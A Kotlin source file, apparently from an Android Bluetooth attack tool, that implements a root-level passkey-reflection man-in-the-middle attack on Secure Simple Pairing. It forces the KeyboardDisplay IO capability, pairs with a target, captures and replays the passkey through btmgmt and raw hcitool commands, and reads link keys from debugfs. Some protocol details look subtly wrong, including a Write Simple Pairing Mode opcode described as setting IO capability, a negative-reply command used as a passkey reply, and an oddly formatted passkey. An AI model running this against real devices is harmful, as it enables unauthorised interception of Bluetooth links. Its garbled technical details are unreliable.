package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow

/**
 * Implementation of the Passkey Reflection MITM attack against Secure Simple Pairing.
 *
 * This module exploits the fact that the verifier's passkey commitment during SSP
 * (Secure Simple Pairing) or SMP (Security Manager Protocol) can be captured and
 * replayed back to the initiator. By reflecting the passkey commitment, an attacker
 * positioned as a man-in-the-middle can bypass the authenticated pairing protections
 * that passkey-based pairing is supposed to provide.
 *
 * The attack affects both BR/EDR (SSP) and BLE (SMP) connections where passkey entry
 * is used as the association model. Numeric Comparison is not affected because both
 * sides must independently confirm the same displayed value.
 *
 * The module first checks for a dedicated native binary (`passkey_reflect`).
 * If that binary is not present, it falls back to btmgmt/hcitool to set the local
 * IO capability, initiate pairing, capture the passkey commitment from the target,
 * reflect it back, and analyze whether the target accepts the reflected value.
 *
 * Root is required for all approaches (HCI-level manipulation, btmgmt/hcitool access).
 * All privileged operations are executed through [RootExecutor].
 */
class PasskeyReflectionModule {

    companion object {
        private const val TAG = "PasskeyReflectionModule"
        private const val PASSKEY_REFLECT_BINARY_PATH = "/data/local/tmp/passkey_reflect"

        /**
         * btmgmt IO capability value for KeyboardDisplay.
         *
         * KeyboardDisplay (0x04) is used because it forces the target into Passkey
         * Entry mode during SSP, which is the association model this attack targets.
         * The local side claims it can both display and input a passkey, causing the
         * remote to send its passkey commitment first.
         *
         * Source: Bluetooth Core Specification v5.4, Vol 3, Part C, Section 5.2.2.6.
         */
        private const val IO_CAP_KEYBOARD_DISPLAY = 4
    }

    /** Reference to a running hcidump process for cancellation. */
    private var monitorProcessId: String? = null

    /**
     * Checks if the device has root access via [RootExecutor].
     *
     * @return true if a root shell reports uid=0.
     */
    suspend fun checkRoot(): Boolean {
        return RootExecutor.isRootAvailable()
    }

    /**
     * Stops any running attack by killing the monitoring process.
     */
    suspend fun stopAttack() {
        monitorProcessId?.let { pid ->
            RootExecutor.execute("kill $pid 2>/dev/null")
            monitorProcessId = null
        }
    }

    /**
     * Executes the Passkey Reflection MITM attack against the target device.
     *
     * The flow:
     * 1. Verify root access (required, no simulation fallback)
     * 2. Check if the native passkey_reflect binary exists
     * 3. If it exists, run it against the target
     * 4. Otherwise, fall back to btmgmt/hcitool-based probing
     *
     * @param targetDevice The Bluetooth device to attack.
     * @return A Flow of status strings for the UI console.
     */
    fun startAttack(targetDevice: TargetDevice): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        emit("Starting Passkey Reflection MITM attack on ${targetDevice.name ?: mac}")
        emit("Target protocol: ${targetDevice.protocol} (SSP/SMP passkey reflection affects BR/EDR and BLE)")

        // Root is strictly required -- no simulation fallback
        if (!checkRoot()) {
            emit("ERROR: Root access is not available.")
            emit("Passkey Reflection requires root for HCI-level manipulation. Aborting.")
            return@flow
        }
        emit("Root access confirmed.")

        // Check if the dedicated native binary exists
        val binaryCheck = RootExecutor.execute("ls $PASSKEY_REFLECT_BINARY_PATH")
        val binaryExists = !binaryCheck.startsWith("Error") &&
                !binaryCheck.contains("No such file") &&
                binaryCheck.trim().isNotEmpty()

        if (binaryExists) {
            // Use the native passkey_reflect binary
            emit("Native passkey_reflect binary found at $PASSKEY_REFLECT_BINARY_PATH")
            emit("Executing: $PASSKEY_REFLECT_BINARY_PATH -t $mac")

            val output = RootExecutor.execute("$PASSKEY_REFLECT_BINARY_PATH -t $mac")
            // Emit each line of output from the binary
            for (line in output.lines()) {
                if (line.isNotBlank()) {
                    emit(line)
                }
            }

            if (output.startsWith("Error")) {
                emit("passkey_reflect execution failed.")
            } else {
                emit("passkey_reflect execution completed.")
            }
        } else {
            // Fallback: use btmgmt/hcitool to probe the connection
            emit("Native binary not found at $PASSKEY_REFLECT_BINARY_PATH")
            emit("Falling back to btmgmt/hcitool-based passkey reflection probing...")

            executeBtmgmtApproach(mac)
        }
    }

    /**
     * Uses btmgmt to set the local IO capability to KeyboardDisplay, initiate SSP
     * pairing with the target, capture the passkey commitment, reflect it back, and
     * analyze whether MITM was achieved.
     *
     * The KeyboardDisplay capability forces the target into Passkey Entry mode where
     * the verifier sends its commitment first. This commitment is then reflected back
     * to test whether the target accepts its own reflected value, which would indicate
     * susceptibility to a passkey reflection MITM attack.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeBtmgmtApproach(
        mac: String
    ) {
        // Step 1: Set local IO capability to KeyboardDisplay
        emit("Setting local IO capability to KeyboardDisplay (0x04)...")
        emit("Executing: btmgmt io-cap $IO_CAP_KEYBOARD_DISPLAY")
        val ioCapResult = RootExecutor.execute("btmgmt io-cap $IO_CAP_KEYBOARD_DISPLAY")
        if (ioCapResult.startsWith("Error")) {
            emit("Failed to set IO capability: $ioCapResult")
            emit("Attempting alternative: hcitool cmd to set IO capability via HCI...")
            // HCI_Write_Simple_Pairing_Mode + IO Capability setting
            val hciResult = RootExecutor.execute("hcitool cmd 0x03 0x0056 04")
            if (hciResult.startsWith("Error")) {
                emit("Failed to set IO capability via HCI: $hciResult")
                emit("Cannot proceed without KeyboardDisplay IO capability. Aborting.")
                return
            }
            emit("IO capability set via HCI command.")
        } else {
            emit("IO capability result: ${ioCapResult.ifBlank { "OK" }}")
        }

        // Step 2: Start HCI event monitoring to capture passkey commitment
        emit("Starting HCI event monitoring to capture passkey commitment...")
        val hcidumpCheck = checkBinary("hcidump")
        val btmonCheck = checkBinary("btmon")

        if (hcidumpCheck) {
            emit("Using hcidump for HCI event capture...")
            // Start hcidump in background to capture the passkey notification event
            val bgResult = RootExecutor.execute(
                "hcidump -X 2>/dev/null &" +
                " echo \$!"
            )
            val pid = bgResult.trim().lines().lastOrNull()?.trim()
            if (pid != null && pid.all { it.isDigit() }) {
                monitorProcessId = pid
                emit("HCI monitor started (PID: $pid)")
            } else {
                emit("HCI monitor started (PID tracking unavailable)")
            }
        } else if (btmonCheck) {
            emit("Using btmon for HCI event capture...")
            val bgResult = RootExecutor.execute(
                "btmon 2>/dev/null &" +
                " echo \$!"
            )
            val pid = bgResult.trim().lines().lastOrNull()?.trim()
            if (pid != null && pid.all { it.isDigit() }) {
                monitorProcessId = pid
                emit("HCI monitor started (PID: $pid)")
            } else {
                emit("HCI monitor started (PID tracking unavailable)")
            }
        } else {
            emit("WARNING: Neither hcidump nor btmon found. Passkey capture will be limited.")
            emit("Continuing with btmgmt output analysis only...")
        }

        // Step 3: Initiate SSP pairing with target
        emit("Initiating SSP pairing with $mac...")
        emit("Executing: btmgmt pair -c $IO_CAP_KEYBOARD_DISPLAY -t 1 $mac")
        val pairResult = RootExecutor.execute("btmgmt pair -c $IO_CAP_KEYBOARD_DISPLAY -t 1 $mac")

        for (line in pairResult.lines()) {
            if (line.isNotBlank()) {
                emit("  pair: $line")
            }
        }

        // Step 4: Capture the passkey commitment from the target
        emit("Analyzing pairing output for passkey commitment...")
        val passkeyCommitment = extractPasskeyCommitment(pairResult)

        if (passkeyCommitment != null) {
            emit("Passkey commitment captured: $passkeyCommitment")

            // Step 5: Reflect the commitment back
            emit("Reflecting passkey commitment back to initiator...")
            reflectPasskeyCommitment(mac, passkeyCommitment)
        } else {
            emit("No passkey commitment captured from pairing output.")
            emit("Attempting direct passkey reflection via HCI commands...")
            attemptDirectReflection(mac)
        }

        // Step 6: Check if the target accepted the reflected value
        emit("Checking pairing result after reflection attempt...")
        analyzeReflectionResult(mac, pairResult)

        // Cleanup: stop HCI monitor
        stopAttack()
        emit("HCI monitor stopped.")

        // Restore default IO capability
        emit("Restoring default IO capability...")
        RootExecutor.execute("btmgmt io-cap 1")
        emit("IO capability restored to DisplayYesNo.")
    }

    /**
     * Extracts a passkey commitment value from the btmgmt pairing output.
     *
     * Looks for passkey notification events in the output, which contain the
     * 6-digit passkey that the target committed to during SSP negotiation.
     *
     * @param pairOutput Raw text output from the btmgmt pair command.
     * @return The passkey string if found, null otherwise.
     */
    private fun extractPasskeyCommitment(pairOutput: String): String? {
        // Look for passkey patterns in the output
        val passkeyPatterns = listOf(
            Regex("(?i)passkey[:\\s]+([0-9]{6})"),
            Regex("(?i)pin[:\\s]+([0-9]{6})"),
            Regex("(?i)confirm[:\\s]+([0-9]{6})"),
            Regex("(?i)User Passkey Notification.*?([0-9]{6})")
        )

        for (pattern in passkeyPatterns) {
            val match = pattern.find(pairOutput)
            if (match != null) {
                return match.groupValues[1]
            }
        }
        return null
    }

    /**
     * Reflects the captured passkey commitment back to the target by sending it
     * as a passkey reply via btmgmt or HCI command.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.reflectPasskeyCommitment(
        mac: String,
        passkey: String
    ) {
        emit("Sending reflected passkey ($passkey) back to $mac...")

        // Try btmgmt passkey-reply first
        val replyResult = RootExecutor.execute("btmgmt passkey-neg $mac $passkey")
        if (replyResult.startsWith("Error")) {
            emit("btmgmt passkey reply failed: $replyResult")

            // Fallback: use HCI command directly
            // HCI_User_Passkey_Request_Reply (OGF 0x01, OCF 0x002E)
            emit("Attempting HCI User_Passkey_Request_Reply command...")
            val passkeyInt = passkey.toIntOrNull() ?: 0
            val passkeyHex = String.format("%08x", passkeyInt)
            // Convert MAC to HCI format (reversed bytes)
            val macBytes = mac.split(":").reversed().joinToString(" ")
            val hciResult = RootExecutor.execute(
                "hcitool cmd 0x01 0x002E $macBytes $passkeyHex"
            )
            if (hciResult.startsWith("Error")) {
                emit("HCI passkey reply also failed: $hciResult")
            } else {
                emit("HCI passkey reply sent. Result: ${hciResult.ifBlank { "OK" }}")
            }
        } else {
            emit("Passkey reply result: ${replyResult.ifBlank { "OK" }}")
        }
    }

    /**
     * Attempts a direct passkey reflection when no commitment was captured from the
     * btmgmt output. Reads the HCI event log for any passkey notification events
     * that may have been logged by the background monitor.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.attemptDirectReflection(
        mac: String
    ) {
        // Read any HCI events that were captured by the background monitor
        emit("Checking HCI event log for passkey notifications...")
        val hciLog = RootExecutor.execute(
            "cat /tmp/hcidump_passkey.log 2>/dev/null || " +
            "dmesg | grep -i 'passkey\\|ssp\\|user_confirm' | tail -20"
        )

        if (hciLog.isBlank() || hciLog.startsWith("Error")) {
            emit("No passkey events found in HCI log or dmesg.")
            emit("The target may not have reached passkey exchange phase.")
        } else {
            for (line in hciLog.lines()) {
                if (line.isNotBlank()) {
                    emit("  hci: $line")
                }
            }

            // Try to extract a passkey from the HCI log
            val passkey = extractPasskeyCommitment(hciLog)
            if (passkey != null) {
                emit("Passkey found in HCI log: $passkey")
                reflectPasskeyCommitment(mac, passkey)
            } else {
                emit("No numeric passkey found in HCI event log.")
            }
        }
    }

    /**
     * Analyzes the outcome of the passkey reflection attempt to determine whether
     * MITM was achieved, based on the pairing result and link key status.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.analyzeReflectionResult(
        mac: String,
        pairOutput: String
    ) {
        val upper = pairOutput.uppercase()

        emit("")
        emit("=== Passkey Reflection Analysis ===")

        // Check connection and encryption status
        val connResult = RootExecutor.execute("hcitool con")
        val targetConnected = connResult.contains(mac, ignoreCase = true)

        // Check link key type from debugfs
        val linkKeyResult = RootExecutor.execute(
            "cat /sys/kernel/debug/bluetooth/hci0/link_keys 2>/dev/null"
        )
        val targetKeyEntry = linkKeyResult.lines().find { it.contains(mac, ignoreCase = true) }

        when {
            targetConnected && (upper.contains("PAIRED") || upper.contains("SUCCESS")) -> {
                emit("VULNERABILITY CONFIRMED: Target accepted reflected passkey commitment.")
                emit("An authenticated pairing link was established using the target's own")
                emit("reflected passkey value. This means a MITM attacker can intercept the")
                emit("passkey commitment and reflect it to establish an authenticated link")
                emit("without knowing the actual passkey.")
                if (targetKeyEntry != null) {
                    emit("Link key entry: $targetKeyEntry")
                    // Check if the key type indicates authenticated
                    if (targetKeyEntry.contains("04") || targetKeyEntry.contains("auth", ignoreCase = true)) {
                        emit("Link key type indicates AUTHENTICATED -- MITM achieved on an")
                        emit("ostensibly authenticated connection.")
                    }
                }
                Log.w(TAG, "Passkey reflection vulnerability confirmed on $mac")
            }
            upper.contains("REJECTED") || upper.contains("DENIED") || upper.contains("FAILED") -> {
                emit("Target rejected the pairing attempt.")
                emit("The device may enforce commitment validation that prevents reflection,")
                emit("or the pairing did not reach the passkey exchange phase.")
                emit("Assessment: NOT VULNERABLE to passkey reflection (pairing rejected).")
            }
            upper.contains("TIMEOUT") || upper.contains("TIMED OUT") -> {
                emit("Pairing attempt timed out.")
                emit("The target may be out of range or did not respond to the SSP request.")
                emit("Assessment: INCONCLUSIVE (timeout).")
            }
            upper.contains("NUMERIC COMPARISON") || upper.contains("CONFIRM") -> {
                emit("Target negotiated Numeric Comparison instead of Passkey Entry.")
                emit("Numeric Comparison is not vulnerable to passkey reflection because")
                emit("both sides independently confirm the same displayed value.")
                emit("Assessment: NOT APPLICABLE (Numeric Comparison negotiated).")
            }
            upper.contains("JUST WORKS") -> {
                emit("Target negotiated Just Works pairing.")
                emit("Just Works does not use passkey exchange and is inherently")
                emit("unauthenticated. Passkey reflection is not applicable, but the")
                emit("connection has no MITM protection regardless.")
                emit("Assessment: NOT APPLICABLE (Just Works -- no passkey exchange).")
            }
            else -> {
                emit("Pairing result inconclusive.")
                emit("Raw output analysis did not definitively indicate whether the")
                emit("reflected passkey was accepted. Manual analysis recommended.")
                emit("Assessment: INCONCLUSIVE.")
                if (targetConnected) {
                    emit("Note: A connection to $mac IS active -- further investigation warranted.")
                }
            }
        }

        // Cleanup: unpair if we established a bond
        if (targetConnected) {
            emit("")
            emit("Cleaning up test bond...")
            val unpairResult = RootExecutor.execute("btmgmt unpair $mac")
            if (unpairResult.startsWith("Error")) {
                emit("Auto-unpair failed: $unpairResult")
                Log.w(TAG, "Failed to unpair $mac after passkey reflection test: $unpairResult")
            } else {
                emit("Auto-unpair succeeded.")
            }
        }
    }

    /**
     * Checks if a binary is available in PATH via root shell.
     */
    private suspend fun checkBinary(name: String): Boolean {
        val result = RootExecutor.execute("which $name")
        return !result.startsWith("Error") && result.isNotBlank()
    }
}
